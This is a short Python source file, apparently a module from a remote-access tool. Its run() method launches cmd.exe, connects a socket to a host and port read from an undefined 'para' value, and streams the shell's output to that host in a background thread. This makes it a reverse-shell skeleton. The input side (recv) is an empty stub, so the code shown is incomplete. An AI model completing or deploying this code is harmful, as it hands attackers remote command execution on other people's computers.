import socket
import os
import threading
import subprocess as sp

class Module:
    def __init__(self) -> None:
        self.p = None
        self.s = None

    def go(self):
        while True:
            o = os.read(self.p.stdout.fileno(), 1024)
            self.s.send(o)

    def recv(self):
        pass

    def run(self):
        p = sp.Popen(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)
        s = socket.socket()

        self.p = p
        self.s = s

        s.connect((para[0], int(para[1])))
        threading.Thread(target=self.go, daemon=True).start()
